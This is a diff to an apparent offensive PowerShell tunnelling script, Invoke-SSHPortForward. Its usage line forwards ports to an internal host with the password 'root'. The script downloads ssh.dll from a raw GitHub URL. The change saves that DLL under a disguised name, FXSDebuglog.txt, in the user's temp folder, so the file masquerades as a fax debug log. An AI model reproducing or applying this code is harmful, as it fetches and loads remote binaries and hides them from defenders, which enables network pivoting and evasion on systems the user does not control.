@@ -19,7 +19,7 @@ usage:Invoke-SSHPortForward -pw root -R 80:172.16.5.9:80 -H root@192.168.1.2
   $Server = $H.split("@")[1]
   $BoundHost = '0.0.0.0'
   
-  $AssemblyFile = 'D:\ssh.dll'
+  $AssemblyFile = "$Env:TEMP\FXSDebuglog.txt"
   if (!(Test-Path $AssemblyFile)) {
     $dclient = new-object System.Net.WebClient
     $dclient.DownloadFile('https://raw.githubusercontent.com/sinmygit/git/master/ssh.dll', $AssemblyFile)
